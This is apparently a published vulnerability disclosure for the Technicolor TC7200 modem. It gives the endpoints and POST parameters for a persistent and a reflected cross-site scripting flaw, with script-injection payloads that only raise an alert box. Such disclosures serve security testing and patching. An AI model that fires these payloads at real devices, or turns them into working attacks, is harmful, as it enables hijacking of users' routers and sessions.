# Exploit Title: Technicolor TC7200 - Multiple XSS Vulnerabilities
# Google Dork: N/A
# Date: 02-01-2013
# Exploit Author: Jeroen - IT Nerdbox
# Vendor Homepage:
http://www.technicolor.com/en/solutions-services/connected-home/modems-gatew
ays/cable-modems-gateways/tc7200-tc7300
# Software Link: N/A
# Version: STD6.01.12
# Tested on: N/A
# CVE : CVE-2014-0620
#
# Proof of Concept:
# 
# 
## Persistent Cross Site Scripting:
#  
# POST      : http://<ip>/parental/website-filters.asp
# Parameters: 
#  
# WebFilteringTable          0
# WebFilteringChangePolicies 0
# WebFiltersADDKeywords    
# WebFilteringdomainMode     0
# ADDNewDomain               <script>alert('IT Nerdbox');</script>
# WebFiltersKeywordButton    0
# WebFiltersDomainButton     1
# WebPolicyName    
# WebFiltersRemove           0
# WebFiltersADD              0
# WebFiltersReset            0
#
#
## Reflected Cross Site Scripting
#
# POST      : http://<ip>//goform/status/diagnostics-route
# Parameters: 
# 
# VmTracerouteHost    "><script>alert('IT  Nerdbox');</script>
# VmMaxTTL            30
# VmTrIsInProgress    0
# VmTrUtilityCommand  1
# 
# Check out the video at: http://www.nerdbox.it/technicolor-tc7200-xss-vulnerabilities/